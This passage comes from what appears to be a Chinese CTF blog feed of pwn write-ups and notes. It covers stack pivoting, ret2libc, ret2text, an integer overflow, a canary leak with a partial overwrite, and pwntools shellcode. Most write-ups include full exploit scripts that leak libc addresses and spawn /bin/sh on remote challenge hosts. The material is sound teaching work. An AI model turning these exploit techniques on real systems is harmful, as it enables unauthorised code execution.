<h4 id="注："><a href="#注：" class="headerlink" title="注："></a>注：</h4><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">0xBAAAAAAD</span>是-<span class="number">1163220307</span>对应的<span class="number">16</span>进制的补码作为win_function<span class="number">2</span>函数的参数</span><br><span class="line"><span class="attribute">0xDEADBAAD</span>是-<span class="number">559039827</span>对应的<span class="number">16</span>进制的补码作为flag函数的参数</span><br></pre></td></tr></table></figure>

<p><img src="/img/image-20210717103414365.png" alt="image-20210717103414365"></p>
]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>pwn1</title>
    <url>/2021/07/15/pwn1/</url>
    <content><![CDATA[<h2 id="Black-Watch-入群题-PWN"><a href="#Black-Watch-入群题-PWN" class="headerlink" title="[Black Watch 入群题]PWN"></a>[Black Watch 入群题]PWN</h2><p>检查保护机制，32位，开NX</p>
<p><img src="/img/image-20210715112542782.png" alt="image-20210715112542782"></p>
<p>IDA打开，查看main函数，看到vul_function()函数</p>
<p><img src="/img/image-20210715112703453.png" alt="image-20210715112703453"></p>
<p><img src="/img/image-20210715112745902.png" alt="image-20210715112745902"></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">虽然buf在栈上但输入的长度仅仅能够覆盖<span class="built_in">ebp</span>和返回地址，但s在bss段，而且输入的长度也够长，因此想到了栈迁移，覆盖vul_function返回地址，使其到bss段上执行</span><br></pre></td></tr></table></figure>



<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>找到s在bss段中的位置是0x804A300</p>
<p><img src="/img/image-20210715113306340.png" alt="image-20210715113306340"></p>
<p>在bss段的s上需要调用system(“/bin/sh”)，但没有提供system和”/bin/sh”的地址，还需要写个ROP链，先泄露write函数的真实地址，再利用LibcSearcher函数可以根据泄露的地址找到相应的libc版本,从而得到system和”/bin/sh”的地址。</p>
<h3 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h3><p>注意:发现做题久了之后，libc版本的问题，如果虚拟机LibcSearcher每次搜出来的libc版本都不是想要的版本，其实有个libc-2.23就可以了，大部分题用2.23都可以跑出来，2.23yyds！</p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># from LibcSearcher import *</span></span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&quot;linux&quot;</span>, arch = <span class="string">&quot;i386&quot;</span>, log_level= <span class="string">&quot;debug&quot;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">27426</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;spwn&quot;</span>)</span><br><span class="line"></span><br><span class="line">bss_s = <span class="number">0x0804A300</span>				<span class="comment">#将fake栈迁移到bss中</span></span><br><span class="line">leave_ret = <span class="number">0x08048511</span>			<span class="comment">#栈迁移所需要的的地址</span></span><br><span class="line">write_plt = elf.plt[<span class="string">&quot;write&quot;</span>]	<span class="comment">#plt表可以调用write函数</span></span><br><span class="line">write_got = elf.got[<span class="string">&quot;write&quot;</span>]	<span class="comment">#got表里有write函数的真实地址</span></span><br><span class="line">main_addr = elf.sym[<span class="string">&quot;main&quot;</span>]	<span class="comment">#控制函数执行流需要再次回到主函数</span></span><br><span class="line"><span class="comment"># 需要打印出write的真实地址查出，并且让函数再次返回主函数</span></span><br><span class="line">payload = <span class="string">b&quot;aaaa&quot;</span> + p32(write_plt) + p32(main_addr)</span><br><span class="line">payload += p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">4</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;name?&quot;</span>, payload)</span><br><span class="line"><span class="comment"># 上面将一些执行流程写入了bss段</span></span><br><span class="line"><span class="comment"># 接下来的写入的buf在栈上，所以可以控制程序执行到bss段</span></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span> * <span class="number">0x18</span> <span class="comment">#这个payload是写到栈上进行栈迁移的，所以先填充到ebp之前</span></span><br><span class="line">payload += p32(bss_s) + p32(leave_ret)</span><br><span class="line">p.sendafter(<span class="string">&quot;say?&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>)) <span class="comment">#接收泄露的地址</span></span><br><span class="line"><span class="comment">#libc = LibcSearcher(&quot;write&quot;, write_addr) #利用LibcSearcher函数可以根据泄露的地址找到相应的libc版本</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line">libc_base = write_addr - libc.sym[<span class="string">&quot;write&quot;</span>]<span class="comment">#获取libc的基地址</span></span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]<span class="comment">#通过获取到的libc的基地址和system在libc中的偏移量可以得到system在程序中的真实地址</span></span><br><span class="line">binsh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))<span class="comment">#通过获取到的libc的基地址和&quot;/bin/sh&quot;在libc中的地址可以得到&quot;/bin/sh&quot;在程序中的真实地址</span></span><br><span class="line"><span class="comment"># 第一次执行得到system函数地址后接下来会再次执行main函数</span></span><br><span class="line"><span class="comment"># 在这次有system函数的情况下再次进行相同的栈迁移执行system(&#x27;/bin/sh&#x27;)</span></span><br><span class="line">payload = <span class="string">b&quot;aaaa&quot;</span> + p32(system_addr) + p32(main_addr)</span><br><span class="line">payload += p32(binsh_addr)</span><br><span class="line">p.sendafter(<span class="string">&quot;name?&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span> * <span class="number">0x18</span> + p32(bss_s) + p32(leave_ret)</span><br><span class="line">p.sendafter(<span class="string">&quot;say?&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/img/image-20210715120438512.png" alt="image-20210715120438512"></p>
]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>pwn2_sctf_2016</title>
    <url>/2021/07/06/pwn2-sctf-2016/</url>
    <content><![CDATA[<h1 id="pwn2-sctf-2016"><a href="#pwn2-sctf-2016" class="headerlink" title="pwn2_sctf_2016"></a>pwn2_sctf_2016</h1><p>检查保护机制，开了NX,32位</p>
<p><img src="/img/image-20210627162616928.png" alt="image-20210627162616928"></p>
<p>尝试运行了一下</p>
<p><img src="/img/image-20210627162846304.png" alt="image-20210627162846304"></p>
<p>IDA打开，main函数很简单，就调用了一个vuln()函数，那就看看vuln()函数</p>
<p><img src="/img/image-20210627163205184.png" alt="image-20210627163205184"></p>
<p><img src="/img/image-20210627163308598.png" alt="image-20210627163308598"></p>
<p><img src="/img/image-20210627164147748.png" alt="image-20210627164147748"></p>
<p>读出内容限制a2输入最大字节长度为32，接受a2个长度的字符串并放到vuln函数的缓冲区内部，但是a2传入的值类型是unsigned int，而前面判断长度的类型是int，可以规避长度限制。也就是说我们这边可以输入负数来达到溢出的效果（整数溢出）</p>
<p>这里发现输入函数是get_n,而不是get，说明是自定义函数</p>
<p>shift+F12查找字符串，没有看见system(‘/bin/sh’)字样</p>
<p><img src="/img/image-20210627163859886.png" alt="image-20210627163859886"></p>
<h3 id="利用思路："><a href="#利用思路：" class="headerlink" title="利用思路："></a>利用思路：</h3><p>1.通过输入负数，绕过长度限制，造成溢出</p>
<p>2.利用printf函数泄露程序的libc版本，算出system和‘/bin/sh’的地址</p>
<p>3.溢出覆盖返回地址执行system(‘/bin/sh’)，夺权</p>
<h3 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h3><p>整数溢出</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">r.recvuntil(<span class="string">&#x27;How many bytes do you want me to read?&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;-1&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>泄露libc</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">r.recvuntil(<span class="string">&#x27;How many bytes do you want me to read?&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x2c</span>+<span class="number">4</span>)+p32(printf_plt)+p32(main)+p32(printf_got)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">printf_addr=u32(r.recv(<span class="number">4</span>))</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;printf&#x27;</span>,printf_addr)</span><br></pre></td></tr></table></figure>

<p>算出system和’/bin/sh’的地址</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">offset=printf_addr-libc.dump(<span class="string">&#x27;printf&#x27;</span>)</span><br><span class="line">system=offset+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh=offset+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>覆盖返回地址，夺权</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">r.recvuntil(<span class="string">&#x27;How many bytes do you want me to read?&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x2c</span>+<span class="number">4</span>)+p32(system)+p32(main)+p32(bin_sh)</span><br><span class="line">r.sendline(payload)</span><br></pre></td></tr></table></figure>

<h3 id="exp："><a href="#exp：" class="headerlink" title="exp："></a>exp：</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25624</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn2_sctf_2016&#x27;</span>)</span><br><span class="line"></span><br><span class="line">printf_plt=elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">printf_got=elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">main=elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;How many bytes do you want me to read? &#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x2c</span>+<span class="number">4</span>)+p32(printf_plt)+p32(main)+p32(printf_got)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">printf_addr=u32(r.recv(<span class="number">4</span>))</span><br><span class="line"><span class="comment">#libc=LibcSearcher(&#x27;printf&#x27;,printf_addr)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line">offset=printf_addr-libc.sym[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">system=offset+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh=offset+ <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;How many bytes do you want me to read? &#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x2c</span>+<span class="number">4</span>)+p32(system)+p32(main)+p32(bin_sh)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="/img/image-20210706132149436.png" alt="image-20210706132149436"></p>
]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>ret2libc</title>
    <url>/2021/06/20/ret2libc/</url>
    <content><![CDATA[<span id="more"></span>
<h1 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h1><p>libc是Linux下的ANSIC的函数库。</p>
<p>ret2libc 即控制函数的执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)。一般情况下，我们会选择执行 system(“/bin/sh”)，故而此时我们需要知道 system 函数的地址。</p>
<h3 id="非执行堆栈"><a href="#非执行堆栈" class="headerlink" title="非执行堆栈"></a>非执行堆栈</h3><p>非执行堆栈是为避免堆或者堆栈的内存区域被植入恶意代码执行，当然也可以直接防止一部分内存被写入恶意代码。换句话说，这是个防止缓冲区溢出的功能。</p>
<p>当checksec发现NX(No-eXecute)开启后，其实就已经是非执行堆栈了，这时候就需要用到libc库。</p>
<h5 id="libc是怎么来的：不再用指令覆盖EIP，直接调用libc库中我们需要的函数覆盖"><a href="#libc是怎么来的：不再用指令覆盖EIP，直接调用libc库中我们需要的函数覆盖" class="headerlink" title="libc是怎么来的：不再用指令覆盖EIP，直接调用libc库中我们需要的函数覆盖"></a>libc是怎么来的：不再用指令覆盖EIP，直接调用libc库中我们需要的函数覆盖</h5><p>思路：</p>
<p>1.泄露 一个调用函数的 地址</p>
<p>2.获取 libc 版本</p>
<p>3.获取 system 地址与 /bin/sh 的地址</p>
<p>4.再次执行源程序</p>
<p>5.触发栈溢出执行 system(‘/bin/sh’)</p>
<p>shellcode结构：</p>
<p><img src="/img/shellcode.png"></p>
<p>正常堆栈布局：</p>
<p><img src="/img/1.png"></p>
<p>ret2libc执行system的堆栈布局：</p>
<p><img src="/img/2.png"></p>
<p>具体例题可以查看[OGeek2019]babyrop的writeup。</p>
<p>平常的shellcode在源程序里就能找到system函数和/bin/sh，而ret2libc类型的题差别就在这里，我们需要通过libc库查找到system函数和/bin/sh在源程序中的位置，然后才能构造shellcode进行夺权，最后拿下flag。</p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable_simple_login</title>
    <url>/2022/01/21/pwnable_simple_login/</url>
    <content><![CDATA[<span id="more"></span>
<h2 id="pwnable-simple-login"><a href="#pwnable-simple-login" class="headerlink" title="pwnable_simple_login"></a>pwnable_simple_login</h2><p>小萌新斗胆做了一下buu上第六页的一道pwn题，<del>纯粹是为了冲分，就是卷（bushi</del></p>
<p>首先检查保护机制，32位文件，开NX，没有开PIE，那这个题目应该不会太难。</p>
<p><img src="/img/1643120143654.png" alt="1643120143654"></p>
<p>继续看IDA，main函数</p>
<p><img src="/img/1643120156660.png" alt="1643120156660"></p>
<p>这里的base64加密很新颖，以前的pwn题都没有见过，代码分析了一下，就是需要输入的s内容转base64编码，然后进行一个比较，正确的话才能进入到correct函数</p>
<p>而correct函数中有后门函数system(‘/bin/sh’)。那么这个地方就该是关键</p>
<p>于是继续找，找到auth函数里有了一个漏洞点</p>
<p><img src="/img/1643120168747.png" alt="1643120168747"></p>
<p>input最大12个字节，而v4只有8个字节，调试一下发现，覆盖的是主函数的ebp，经过调试发现控制ebp可以跳转到任意地址，那么跳转到哪呢，发现input是个固定地址,  input是我们输入的内容，依靠leave指令将执行system(“/bin/sh”)的地址赋给esp，最后ret指令将地址给eip，完成利用。</p>
<p><img src="/img/1643120181750.png" alt="1643120181750"></p>
<p><img src="/img/1643120196162.png" alt="1643120196162"></p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">io=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">25390</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;Authenticate : &quot;</span>)</span><br><span class="line">payload=<span class="string">&quot;a&quot;</span>*<span class="number">4</span>+p32(<span class="number">0x0804927F</span>)+p32(<span class="number">0x0811EB40</span>)</span><br><span class="line">payload=payload.encode(<span class="string">&quot;base64&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>最后</p>
<p><img src="/img/1643120231450.png" alt="1643120231450"></p>
]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>ret2text</title>
    <url>/2021/06/20/ret2text/</url>
    <content><![CDATA[<span id="more"></span>
<h1 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h1><p>ret2text 即控制程序执行程序本身已有的的代码 (.text),使EIP指向具有system(“/bin/sh”)的代码段。<br>其实，这种攻击方法是一种笼统的描述。我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码 (也就是 gadgets)，这就是我们所要说的 ROP。</p>
<p>这时，我们需要知道对应返回的代码的位置。当然程序也可能会开启某些保护，我们需要想办法去绕过这些保护。</p>
<h2 id="例题：-HarekazeCTF2019-baby-rop-ret2text"><a href="#例题：-HarekazeCTF2019-baby-rop-ret2text" class="headerlink" title="例题： [HarekazeCTF2019]baby_rop(ret2text)"></a>例题： [HarekazeCTF2019]baby_rop(ret2text)</h2><p>先查壳，开了NX，64位</p>
<p><img src="/img/image-20210620201226614.png" alt="image-20210620201226614"></p>
<p>IDA打开，F5查看main函数</p>
<p><img src="/img/image-20210620201505692.png" alt="image-20210620201505692"></p>
<p><img src="/img/image-20210620201559551.png" alt="image-20210620201559551"></p>
<p>看见system函数</p>
<p>然后F12+shift搜索字符串，还找到了’/bin/sh/‘</p>
<p><img src="/img/image-20210620201708611.png" alt="image-20210620201708611"></p>
<p><img src="/img/image-20210620202004923.png" alt="image-20210620202004923"></p>
<p>因为64位传参需要用到寄存器，所以用gadget找到rdi寄存器位置</p>
<p><img src="/img/image-20210620202405923.png" alt="image-20210620202405923"></p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight moonscript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"># <span class="built_in">io</span> = process(<span class="string">&#x27;./babyrop&#x27;</span>)</span><br><span class="line"><span class="built_in">io</span> = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="string">&#x27;28379&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./babyrop&#x27;</span>)</span><br><span class="line"></span><br><span class="line">binsh_addr = <span class="number">0x601048</span></span><br><span class="line">system_addr = e.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">pop_rdi = <span class="number">0x400683</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">io</span>.recvuntil(<span class="string">&#x27;your name?&#x27;</span>)</span><br><span class="line">payload = <span class="number">0x18</span> * b<span class="string">&#x27;a&#x27;</span> + p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)</span><br><span class="line"><span class="built_in">io</span>.sendline(payload)</span><br><span class="line"><span class="built_in">io</span>.interactive()</span><br></pre></td></tr></table></figure>

<p>这里夺权之后还有一个小坑，就是flag不在根目录下，需要通过查找获得位置，然后拿到flag</p>
<p><img src="/img/image-20210620202949778.png" alt="image-20210620202949778"></p>
<p>这是属于最简单的例题，稍微难一点的会涉及到计算地址偏移量。</p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>shellcode</title>
    <url>/2021/11/22/shellcode/</url>
    <content><![CDATA[<span id="more"></span>
<h1 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h1><p>主要是普及一下shellcode在pwntools中的用法</p>
<h2 id="shellcraft模块"><a href="#shellcraft模块" class="headerlink" title="shellcraft模块"></a>shellcraft模块</h2><p>shellcraft模块是shellcode的模块，包含一些生成shellcode的函数。<br>其中的子模块声明架构，比如shellcraft.arm 是ARM架构的，shellcraft.amd64是AMD64架构，shellcraft.i386是Intel 80386架构的，以及有一个shellcraft.common是所有架构通用的。<br>有的时候我们需要在写exp的时候用到简单的shellcode，pwntools提供了对简单的shellcode的支持。<br>首先，常用的，也是最简单的shellcode，即调用/bin/sh可以通过shellcraft得到：<br>注意，由于各个平台，特别是32位和64位的shellcode不一样，所以最好先设置context。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(shellcraft.sh()) <span class="comment"># 打印出shellcode</span></span><br><span class="line"><span class="built_in">print</span>(asm(shellcraft.sh())) <span class="comment"># 打印出汇编后的shellcod</span></span><br></pre></td></tr></table></figure>

<p>asm可以对汇编代码进行汇编，不过pwntools目前的asm实现还有一些缺陷，比如不能支持相对跳转等等，只可以进行简单的汇编操作。</p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>xjusec考核赛</title>
    <url>/2021/08/26/xjusec%E8%80%83%E6%A0%B8%E8%B5%9B/</url>
    <content><![CDATA[<h1 id="xjusec考核赛wp"><a href="#xjusec考核赛wp" class="headerlink" title="xjusec考核赛wp"></a>xjusec考核赛wp</h1><h2 id="REVERSE："><a href="#REVERSE：" class="headerlink" title="REVERSE："></a>REVERSE：</h2><h3 id="justbase64"><a href="#justbase64" class="headerlink" title="justbase64"></a>justbase64</h3><p>这个题是以前看见过的一个类似的题，ida打开</p>
<p><img src="/img/image-20210825211051630.png" alt="image-20210825211051630"></p>
<p>这边目录看见encode_one,encode_two,encode_three三个编码，右边主函数里就是三次编码后形成的”EmBmP5Pmn7QcPU4gLYKv5QcMmB3PWHcP5YkPq3=cT6QckkPckoRG”，题目也有提示base64，但肯定不只有base64</p>
<p>挨个看，在encode_one里面发现一个变量alphabet，肯定了base64的存在</p>
<p><img src="/img/image-20210825211343129.png" alt="image-20210825211343129"></p>
<p>encode_two里面关系一张图解释</p>
<p><img src="/img/image-20210825211513679.png" alt="image-20210825211513679"></p>
<p><img src="/img/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20210825211744.jpg"></p>
<p>就是这样的一个对应关系</p>
<p>encode_three就是有个移位的问题</p>
<p><img src="/img/image-20210825211933760.png" alt="image-20210825211933760"></p>
<p><img src="/img/20200911131956308.png"></p>
<p>要还原就从three开始倒过来还原</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">m</span>(<span class="params">v5</span>):</span></span><br><span class="line">    <span class="keyword">if</span> v5 &lt;= <span class="number">64</span> <span class="keyword">or</span> v5 &gt; <span class="number">90</span>:</span><br><span class="line">        <span class="keyword">if</span> v5 &lt;= <span class="number">96</span> <span class="keyword">or</span> v5 &gt; <span class="number">122</span>:</span><br><span class="line">            <span class="keyword">if</span> v5 &lt;= <span class="number">47</span> <span class="keyword">or</span> v5 &gt; <span class="number">57</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">chr</span>(v5)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">chr</span>((v5 - <span class="number">45</span>) % <span class="number">10</span> + <span class="number">48</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">chr</span>((v5 - <span class="number">94</span>) % <span class="number">26</span> + <span class="number">97</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">chr</span>((v5 - <span class="number">62</span>) % <span class="number">26</span> + <span class="number">65</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mm = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>, <span class="number">127</span>):</span><br><span class="line">    raw = i</span><br><span class="line">    fin = m(i)</span><br><span class="line">    mm[fin] = <span class="built_in">chr</span>(raw)</span><br><span class="line"></span><br><span class="line">data = <span class="string">&quot;EmBmP5Pmn7QcPU4gLYKv5QcMmB3PWHcP5YkPq3=cT6QckkPckoRG&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(mm)</span><br><span class="line">fin2 = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> data:</span><br><span class="line">    fin2 += mm[c]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(fin2)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/img/image-20210825212900481.png" alt="image-20210825212900481"></p>
<p>再还原two，最后base64解码得到flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">data = <span class="string">&quot;BjYjM2Mjk4NzMR1dIVHs2NzJjY0MTEzM2VhMn0=zQ3NzhhMzhlOD&quot;</span></span><br><span class="line"></span><br><span class="line">raw = [<span class="string">&quot;0&quot;</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">38</span>)]</span><br><span class="line"></span><br><span class="line">raw[<span class="number">0</span>: <span class="number">13</span>] = data[<span class="number">13</span>: <span class="number">26</span>]</span><br><span class="line">raw[<span class="number">13</span>: <span class="number">26</span>] = data[<span class="number">39</span>: <span class="number">52</span>]</span><br><span class="line">raw[<span class="number">26</span>: <span class="number">39</span>] = data[<span class="number">0</span>: <span class="number">13</span>]</span><br><span class="line">raw[<span class="number">39</span>: <span class="number">52</span>] = data[<span class="number">26</span>: <span class="number">39</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(base64.b64decode(<span class="string">&quot;&quot;</span>.join(raw).encode()).decode())</span><br></pre></td></tr></table></figure>



<h2 id="pwn："><a href="#pwn：" class="headerlink" title="pwn："></a>pwn：</h2><h3 id="ez-pwn（partial-overwrite-部分覆盖）"><a href="#ez-pwn（partial-overwrite-部分覆盖）" class="headerlink" title="ez_pwn（partial overwrite 部分覆盖）"></a>ez_pwn（partial overwrite 部分覆盖）</h3><p>这个题我觉得一点也不简单，在拿到hint之后才借助互联网的力量把他弄出来，过程艰辛</p>
<p><img src="/img/image-20210825212508971.png" alt="image-20210825212508971"></p>
<p><img src="/img/image-20210825214242973.png" alt="image-20210825214242973"></p>
<p>一种比较新鲜的栈溢出，叫 <strong>花式栈溢出</strong> </p>
<p>partial overwrite：在开启了PIE后，无论高位地址如何变化，低位地址是不变的，意味着有概率“撞到”正确的地址</p>
<p><img src="/img/image-20210825213240232.png" alt="image-20210825213240232"></p>
<p>主要的问题就是开启了canary，而栈溢出在第二次read函数里，有canary保护 ，read读满不会追加\0 。可以计算出第一次 read 需要的长度为 0x30 - 0x8 + 1 (+ 1 是为了覆盖 canary 的最低位为非 0 的值, printf 使用 %s 时, 遇到 \0 结束, 覆盖 canary 低位为非 0 值时, canary 就可以被 printf 打印出来了)</p>
<p><img src="/img/image-20210825213949666.png" alt="image-20210825213949666"></p>
<p>同时也发现了夺权函数，那么第二次栈溢出只要返回到夺权函数地址就行了</p>
<p>最后脚本多次的尝试才拿到了flag，因为返回地址与 get shell 函数的地址只有低位的 16 bit 不同, 如果覆写低 16 bit 为<code>0x0A3E</code>, 就有一定的几率 get shell</p>
<h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    io=remote(<span class="string">&quot;175.24.233.124&quot;</span>,<span class="number">10001</span>)</span><br><span class="line">    <span class="comment">#io=process(&#x27;./ez_pwn&#x27;,timeout=1)</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Name:\n&#x27;</span>)</span><br><span class="line">    payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x28</span>)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line">    io.recvuntil(payload+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    canary=u64(io.recvn(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;canary:&#x27;</span>+<span class="built_in">hex</span>(canary))</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;:\n&#x27;</span>)</span><br><span class="line">    payload=<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x28</span>+p64(canary)+<span class="string">b&#x27;A&#x27;</span>*<span class="number">8</span>+<span class="string">b&#x27;\x3E\x0A&#x27;</span></span><br><span class="line">    io.send(payload)</span><br><span class="line">    io.interactive()</span><br><span class="line">    io.close()</span><br></pre></td></tr></table></figure>



